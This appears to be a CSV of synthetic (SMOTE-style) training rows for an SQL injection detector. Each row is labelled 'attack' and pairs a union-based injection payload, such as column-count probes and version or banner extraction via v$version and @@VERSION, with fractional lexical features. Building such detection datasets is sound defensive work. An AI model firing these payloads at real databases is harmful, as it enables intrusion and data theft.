id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000071,0.2650065107160895,111.21501231183755,28.486004924735024,4.18198937264159,37.0,40.97200984947005,17.0,16.243002462367514,0.33280984541201664,0.3682466870330595,0.15291263167579142,0.14603083587913243,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.243002462367512,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000031,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,0.8370201422444861,78.95791450937513,31.293229551897298,4.380748974837903,43.109789971651885,3.2827081792410766,17.989478627343782,14.57593773113838,0.5430314132684643,0.04120768542588421,0.22756328160406555,0.18819761970158597,3.0,0.0,2.0,0.0,1.85864591037946,1.14135408962054,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.1413540896205402,2.0,1.0,1.14135408962054,1.14135408962054,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.28270817924108
SMOTE_000032,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000030,0.41068418952938807,55.886541172060184,20.0,3.838730052558709,14.0,27.90923293764815,4.0,9.977308234412037,0.2541855090882821,0.4949773890940615,0.07262443116808058,0.17821267064957583,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,4.977308234412037,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,0.06408841255267715,36.398678704078975,20.0,4.0997454339245,14.0,12.318942963263183,4.0,6.079735740815796,0.3861202867772293,0.3366556558673248,0.11032008193635123,0.16690397541909463,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.0797357408157957,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,2.0947819873683096,90.78274414487149,28.492723523361896,4.195555396080543,56.86001374767306,3.1690921588793692,21.09182255607779,9.661815682241263,0.6219686651896907,0.03400214687924308,0.23170980931281296,0.1123193786182532,0.0,0.0,2.0,0.0,1.4154539205603158,1.5845460794396844,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.415453920560315,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.5845460794396842,1.5845460794396844,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.169092158879369
SMOTE_000035,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,0.8359924005063841,102.0,27.69525891424097,4.157489356432878,62.60948217151806,4.0,23.152370542879517,12.238147285602427,0.6138184526619417,0.039215686274509776,0.22698402493019132,0.11998183613335711,2.542888371361456,1.6952589142409706,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.8476294571204853,0.8476294571204853,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000036,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,0.8907960312726801,83.09128529787182,28.908714702128183,3.993550202467658,42.90871470212818,3.0,25.0,12.182570595743638,0.5164225548577382,0.036105298925184215,0.30087749104320205,0.14659465517387552,2.0912852978718184,1.0912852978718188,2.0,0.0,1.0,1.0,0.9087147021281814,2.0,0.0,3.469446951953614e-18,1.0,4.091285297871819,1.0,1.0,1.0,0.9087147021281813,0.0,1.0,1.0,0.9087147021281814,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000037,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000026,0.26984048517891823,104.9183096821628,27.0,4.08512084859905,29.0,46.33464774573025,15.0,14.583661936432561,0.2765593750428146,0.44142646546173003,0.14304795260835237,0.13896620688710298,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.583661936432561,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000038,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,0.8791927530209702,99.99763584836495,29.498817924182475,4.226699457483325,37.0,32.665090565576634,17.0,13.332545282788317,0.37018638514771496,0.32649539382822595,0.17008563641922037,0.13323258460483878,3.0,0.0,1.3325452827883175,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.166272641394158,4.332545282788318,1.0,0.0,0.16627264139415876,0.8337273586058412,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000039,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.6652682442710136,100.21404160980984,26.0,3.8415786382319452,25.0,40.17123328784787,22.0,13.042808321961967,0.2515012840061349,0.39759794559018413,0.2213211299253987,0.12957964047828222,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,6.042808321961967,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,0.4512636242748631,81.98689110059199,26.3013108899408,3.9944889198578886,25.0,25.589512880473595,22.0,9.3973782201184,0.30593376038983533,0.3105059833762635,0.2692217091430551,0.11433854709084612,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,2.3973782201183993,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,1.1192181910501855,76.3439339631909,28.60934433946818,4.322088026057698,29.0,21.562622642127273,15.0,10.781311321063637,0.3804097829505851,0.2818843574752703,0.19676368083650952,0.14094217873763515,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.3906556605318183,5.390655660531818,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.3906556605318184,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,0.6673556295556198,39.435431922602454,19.881421392854453,3.9182248041173393,15.909746351184644,10.350457047611872,8.440710696427226,4.73451782737871,0.4071397386179965,0.2503861160886429,0.2234882801564648,0.11898586513689574,0.14690356547574202,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,0.5876142619029681,3.0,0.14690356547574202,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,0.4713076825934416,72.17611571117297,25.435223142234594,4.181933583752541,27.0,25.740892568938374,11.0,8.435223142234594,0.37563997452273434,0.35479706723231486,0.15303850813889178,0.11652445010605904,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.435223142234594,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.287039120724004,107.25189956098018,26.0,3.7664284748392913,25.0,45.80151964878415,22.0,14.450379912196036,0.23343292016360212,0.42650732773823663,0.20542096974396987,0.1346387823541914,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,7.450379912196036,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000048,1.4767379810502814,37.993875839122026,21.398775167824404,4.147880176323809,14.0,13.595100671297619,4.0,6.398775167824405,0.36997678743380197,0.3560278550794377,0.10570765355251482,0.16828770393424555,0.3987751678244048,0.6012248321755953,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,1.3987751678244047,3.0,0.3987751678244047,0.6012248321755953,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,0.2758603044113123,74.88705625185189,23.445177499259245,4.051035216250086,27.0,27.109645001481514,11.0,9.777411250370378,0.36083200170496643,0.3616559386695222,0.1470056303242456,0.13050642930126571,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.777411250370378,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,0.9830238525119193,96.72907835457912,26.55139477636139,3.917857096146045,25.0,37.3832626836633,22.0,12.345815670915824,0.25997598318894416,0.3840384268976894,0.22877886520627083,0.12720672470709565,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,5.345815670915823,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,1.3482437068755244,38.21815095302848,19.602592993289782,3.8502958318585465,14.0,9.205185986579565,9.807778979869347,5.205185986579566,0.3755795874127459,0.23972494848007192,0.2522789691736091,0.1324164949335731,0.3012964966448912,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.3012964966448912,0.3012964966448911,3.469446951953614e-18,0.3012964966448908,3.0,0.3012964966448913,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,0.2335205268810916,68.36911517204436,24.0,4.062024009127163,27.0,22.695292137635494,11.0,7.673823034408873,0.39539206381424225,0.3313871836275648,0.1610856556280246,0.11213509693016839,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.673823034408873,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,1.2902575038320863,102.72637497474847,27.27362502525154,4.136432661424214,62.0,4.72637497474846,23.72637497474846,12.273625025251539,0.6035565154735956,0.045991314251413395,0.23095218189654754,0.11949998837844346,3.0,0.5472500505030775,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.726374974748461,1.0,0.2736250252515387,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.7263749747484612,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000051,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000020,1.8212875509384898,79.9840026328332,28.353714849892828,4.0116129440074415,41.384287124732076,3.1077141916845292,23.4920013164166,12.0,0.5171048670626363,0.04008505367170123,0.2903036239740959,0.1525064552915666,2.0,0.8922858083154717,1.7845716166309433,0.21542838336905695,0.8922858083154717,0.8922858083154716,1.0,2.0,0.0,0.10771419168452842,1.323142575053585,3.7845716166309433,1.0,0.8922858083154714,0.8922858083154717,0.8922858083154716,0.0,0.8922858083154716,1.0,1.0,0.0,0.0,0.0,1.8922858083154714,1.0,0.8922858083154716,0.8922858083154717,3.469446951953614e-18,0.8922858083154717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10771419168452848,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.676857424946414
SMOTE_000052,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.9256488863914285,107.40099568709195,26.620298706127585,4.001809889664524,66.0,4.0,28.32079654967356,9.08019913741839,0.6158555921439016,0.037324581342054575,0.2625260286744132,0.08429379783963062,0.0,0.0,2.0,0.0,1.4599004312908048,2.0,3.469446951953614e-18,1.08019913741839,0.0,3.469446951953614e-18,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.540099568709195,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000053,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,0.005416813224229057,114.97516478089481,29.990065912357927,4.314277967247344,37.0,43.980131824715855,17.0,16.995032956178964,0.3218117709965922,0.38251445924766414,0.14785946234978564,0.14781430740595802,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.995032956178962,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000054,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,0.030719141662594665,60.19472904326599,24.980527095673402,4.186617481620883,27.0,16.15578323461279,11.0,6.038945808653198,0.44874817043614723,0.26815031652012183,0.18282332869620813,0.10027818434752284,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.0389458086531977,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,0.12985013748959984,81.91050047866027,23.182100095732054,3.9322621452351125,27.0,32.728400382928214,11.0,11.182100095732054,0.33017187333798514,0.398902316833855,0.13451446691547544,0.13641134291268434,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,6.1821000957320535,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,0.6623425432223845,100.23508918513217,26.0,3.841322930108862,25.0,40.18807134810574,22.0,13.047017837026432,0.2514423272125149,0.39769227645997607,0.22126924794701316,0.12959614838049582,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,2.0,0.0,3.469446951953614e-18,6.0470178370264325,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.08767722507928707,93.34035139861119,27.93403513986112,4.180062498964389,29.0,35.47228111888895,15.0,13.868070279722238,0.3109333598581909,0.3797038721916868,0.1608275999266505,0.14853516802347183,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,4.868070279722238,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,2.200431588491752,102.44938868608114,25.89877737216227,4.072686024391346,64.20244525567546,4.449388686081136,24.0,9.797554744324543,0.6267837200454542,0.04340758530705796,0.23426753012888377,0.09554116451860407,1.3481660582434078,0.0,2.0,0.0,1.5506113139188642,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.449388686081136,0.4493886860811359,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.4493886860811358,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000059,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,0.7444706115008058,87.3719010906976,29.85578516360464,4.314354478361401,33.948760436279045,24.94876043627904,16.23719010906976,12.237190109069761,0.3884030738372909,0.28403073837290893,0.1869769462203183,0.14058924156948188,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.2371901090697603,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,0.6185950545348804,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.618595054534881
